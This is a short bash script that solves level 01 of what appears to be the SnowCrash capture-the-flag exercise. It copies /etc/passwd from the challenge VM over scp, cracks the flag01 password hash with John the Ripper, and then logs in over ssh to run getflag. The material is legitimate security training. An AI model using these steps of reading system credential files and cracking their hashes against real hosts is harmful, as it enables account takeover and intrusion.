#!/bin/bash

set -e
LEVEL="01"

CURDIR=`dirname $0`
PREV_LEVEL=`printf "%02d" $(($LEVEL-1))`
USER="level$LEVEL"
PASSWORD=`cat $CURDIR/../../level$PREV_LEVEL/flag`

if [ -z ${SNOW_HOST+x} ]; then read -p "VM Host: " SNOW_HOST; fi
if [ -z ${SNOW_PORT+x} ]; then read -p "VM Port: " SNOW_PORT; fi

echo -e "$USER Password is: $PASSWORD\n"

# Get /etc/passwd
REMOTE_FILE="/etc/passwd"
DEST_FILE="/tmp/passwd"
(set -x; scp -q -P $SNOW_PORT $USER@$SNOW_HOST:$REMOTE_FILE $DEST_FILE)

# Bruteforce using John-The-Ripper
JTR_OUTPUT="/tmp/jtp_output"
(set -x; docker run -it --rm -v $DEST_FILE:/crackme.txt adamoss/john-the-ripper /crackme.txt > $JTR_OUTPUT)
echo ; cat $JTR_OUTPUT

# Then check flag on flag user
FLAG_LEVEL="flag$LEVEL"
FLAG_CONTENT=`cat $CURDIR/../flag`

PASSWORD=`cat $JTR_OUTPUT | grep $FLAG_LEVEL | cut -d ' ' -f1`
echo -e "\n$FLAG_LEVEL Password is: $PASSWORD\n"

ssh -q $FLAG_LEVEL@$SNOW_HOST -p $SNOW_PORT "getflag"
echo -e "\nExpected flag: $FLAG_CONTENT"